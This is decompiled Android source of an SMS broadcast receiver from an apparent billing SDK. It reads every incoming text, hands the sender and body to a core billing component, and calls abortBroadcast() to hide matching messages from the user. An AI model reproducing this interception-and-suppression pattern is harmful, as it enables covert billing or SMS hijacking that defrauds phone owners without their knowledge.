package com.upay.billing.engine;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.upay.billing.UpayCore;

public class SmsReceiver
  extends BroadcastReceiver
{
  private static final String TAG = "SmsReceiver";
  
  public SmsReceiver() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Log.i("SmsReceiver", "receiver--start");
    Object localObject1;
    if ("android.provider.Telephony.SMS_RECEIVED".equals(paramIntent.getAction()))
    {
      localObject1 = new StringBuilder();
      paramIntent = paramIntent.getExtras();
      if (paramIntent == null) {}
    }
    try
    {
      paramIntent = (Object[])paramIntent.get("pdus");
      if (paramIntent.length > 0)
      {
        Object localObject2 = new SmsMessage[paramIntent.length];
        int i = 0;
        while (i < paramIntent.length)
        {
          localObject2[i] = SmsMessage.createFromPdu((byte[])(byte[])paramIntent[i]);
          i += 1;
        }
        paramIntent = null;
        int j = localObject2.length;
        i = 0;
        while (i < j)
        {
          paramIntent = localObject2[i];
          ((StringBuilder)localObject1).append(paramIntent.getDisplayMessageBody());
          paramIntent = paramIntent.getDisplayOriginatingAddress();
          i += 1;
        }
        localObject2 = ((StringBuilder)localObject1).toString();
        localObject1 = paramIntent;
        if (paramIntent.startsWith("+86")) {
          localObject1 = paramIntent.substring(3);
        }
        if (UpayCore.getInstance(paramContext).smsReceived((String)localObject1, (String)localObject2, 1)) {
          abortBroadcast();
        }
      }
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
}
